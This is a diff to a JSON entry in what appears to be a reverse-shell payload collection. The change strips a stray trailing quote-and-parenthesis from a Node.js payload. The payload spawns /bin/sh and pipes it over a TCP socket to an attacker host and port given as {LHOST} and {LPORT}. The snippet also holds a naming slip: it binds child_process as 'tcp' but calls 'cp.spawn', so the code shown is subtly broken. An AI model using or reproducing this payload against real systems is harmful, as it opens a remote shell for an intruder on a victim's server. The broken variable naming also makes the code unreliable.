@@ -238,7 +238,7 @@
                 "comments":""
             },
             {
-                "command": "(function(){\n\tvar net = require(\"net\"),\n\t\ttcp = require(\"child_process\"),\n\t\tsh = cp.spawn(\"/bin/sh\", []);\n\tvar client = new net.Socket();\n\tclient.connect({LPORT}, \"{LHOST}\", function(){\n\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t});\n\treturn /a/; // Prevents the Node.js application form crashing\n})();''')",
+                "command": "(function(){\n\tvar net = require(\"net\"),\n\t\ttcp = require(\"child_process\"),\n\t\tsh = cp.spawn(\"/bin/sh\", []);\n\tvar client = new net.Socket();\n\tclient.connect({LPORT}, \"{LHOST}\", function(){\n\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t});\n\treturn /a/; // Prevents the Node.js application form crashing\n})();",
                 "comments":""
             }
         ],
